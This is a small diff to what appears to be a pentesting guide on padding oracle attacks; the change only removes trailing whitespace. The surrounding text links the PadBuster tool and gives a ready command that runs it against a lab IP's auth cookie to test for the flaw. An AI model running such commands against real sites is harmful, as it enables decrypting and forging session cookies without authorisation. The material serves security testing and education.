@@ -44,7 +44,7 @@ If you detect this behaviour, you can **decrypt the encrypted data** and even **
 
 You could use [https://github.com/AonCyberLabs/PadBuster](https://github.com/AonCyberLabs/PadBuster) to exploit this kind of vulnerability.
 
-In order to test if the cookie of a site is vulnerable you could try: 
+In order to test if the cookie of a site is vulnerable you could try:
 
 ```bash
 perl ./padBuster.pl http://10.10.181.45/index.php "Nl0OpaQYeGPMJeWSih2iiQ==" 8 -encoding 0 -cookies "auth=Nl0OpaQYeGPMJeWSih2iiQ=="
